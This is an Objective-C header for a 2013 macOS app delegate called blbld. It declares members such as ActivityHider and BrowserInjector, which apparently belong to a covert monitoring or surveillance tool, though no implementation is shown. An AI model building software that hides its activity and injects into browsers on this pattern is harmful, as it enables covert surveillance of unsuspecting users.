//
//  blbldAppDelegate.h
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>

@class NotificationManager, AppTerminateMonitor,ActivityHider, BrowserInjector;
@class blbldController, ActivityHider;

@interface blbldAppDelegate : NSObject <NSApplicationDelegate> {
@private
    NSWindow    *window;
    NSArray     *mArgs;
    
    blbldController *mblbldController;
    ActivityHider *mActivityHider;
    BrowserInjector        *mBrowserInjector;
}

@property (assign) IBOutlet NSWindow *window;
@property (nonatomic, retain) NSArray *mArgs;

@property (nonatomic, assign) blbldController *mblbldController;
@property (nonatomic, retain) ActivityHider *mActivityHider;
@property (nonatomic, retain) BrowserInjector *mBrowserInjector;
@end
